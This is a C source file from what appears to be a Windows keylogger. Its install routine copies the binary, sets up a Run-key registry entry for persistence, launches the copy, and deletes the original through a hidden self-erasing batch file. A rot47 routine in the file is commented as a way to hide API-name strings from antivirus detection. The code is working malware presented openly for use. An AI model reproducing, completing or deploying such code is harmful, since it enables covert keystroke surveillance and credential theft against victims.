/*
 * utils.c
 * contains miscellaneous utility routines. (injection, logger install etc.)
 *
 */

#include <windows.h>
#include "../config.h"


/* install_logger
 * Installs the keylogger
 * @@param lpszInstallPath -> the fully qualified path name where the keylogger will be installed (including filename) 
 * returns FALSE if logger wasnt previously installed, and has been installed (and new logger process started).
 * returns TRUE if logger was already installed.
 */
int install_logger(char *lpszInstallPath){

	
	char szModulePath[MAX_PATH];				/* stores module's filename */
	HKEY hKeyInstallApp;
	char szBatchFileCommand[1024];				/* Holds contructed batch command to delete self */

	/* Stuff needed extrapolate systeminfo etc. */
	HANDLE hStdOut;								/* handle to which CreateProcess process's stdout will be redirected to */
	STARTUPINFO startupinfo;
	PROCESS_INFORMATION procinfo;
	SECURITY_ATTRIBUTES secAttrib;
	SYSTEMTIME stCurrTime;
	char szWriteBuf[400];
	DWORD nBytesWritten;

	/* Check if already installed */
	if(RegOpenKey(HKEY_LOCAL_MACHINE, "Software\\Microsoft\\Windows\\CurrentVersion\\Run", &hKeyInstallApp) == ERROR_SUCCESS){
					
		if(RegQueryValueEx(hKeyInstallApp, REGAPPENTRY, NULL, NULL,	NULL, NULL) == ERROR_SUCCESS)
					return TRUE;					/* return if app is already installed */
	}



	/* Install keylogger  */

	/* Get module's current location */
	GetModuleFileName(NULL, szModulePath, MAX_PATH);
	
	/* copies file to location pointed to by lpszInstallPath */
	if(!CopyFile(szModulePath, lpszInstallPath, FALSE))
		return FALSE;							/* cannot copy keylogger to lpszInstallPath */

	/* Creates registry key for autostart */
	if(RegSetValueEx(hKeyInstallApp,
					REGAPPENTRY,
					0,
					REG_SZ,
					(LPBYTE)lpszInstallPath,
					strlen(lpszInstallPath)+1) != ERROR_SUCCESS)
				return FALSE;					/* Unable to create autostart entry */

	
	/* Start new keylogger instance and delete self */
	ZeroMemory(&procinfo, sizeof(PROCESS_INFORMATION));
	ZeroMemory(&startupinfo, sizeof(STARTUPINFO));
	startupinfo.cb = sizeof(STARTUPINFO);
	
	/* spawn new keylogger instance (from the copied keylogger) */
	CreateProcess(lpszInstallPath, NULL,
					NULL,
					NULL,
					TRUE,
					NORMAL_PRIORITY_CLASS|CREATE_NEW_CONSOLE,
					NULL, WINDIR,
					&startupinfo, &procinfo);
	CloseHandle(procinfo.hThread);
	CloseHandle(procinfo.hProcess);

	/* DeleteSelf
	 *	Creating a batch file to delete this file and then delete itself	
	 */
	sprintf(szBatchFileCommand,
				":Loop\r\ndel /F \"%s\"\r\nif exist \"%s\" goto Loop\r\ndel \"%s\"\r\n",
				szModulePath, szModulePath, BATCHFILEPATH);

	hStdOut = CreateFile(BATCHFILEPATH, GENERIC_WRITE, 0,NULL,
							OPEN_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
	
	
	WriteFile(hStdOut, szBatchFileCommand, strlen(szBatchFileCommand), &nBytesWritten, NULL);

	CloseHandle(hStdOut);

	/* executing batch file */
	ShellExecute(NULL, NULL, BATCHFILEPATH, NULL, NULL, SW_HIDE); 
	
	return FALSE;	/* returning FALSE so that main exists without delay */

}


/* :p rot47 encrypt/decrypter 
 * to fool AV from detecting GetProcAddress strings
 * 	c/o zer0python
 */
void rot47(char *buf){
	
	while(*buf){
	
		if( *buf >= '!' && *buf <= 'O' )
			*buf = (*buf + 47) % 127;
		
		else if( *buf >= 'P' && *buf <= '~' )
			*buf = (*buf - 47) % 127;
		
		buf++;
	}
}

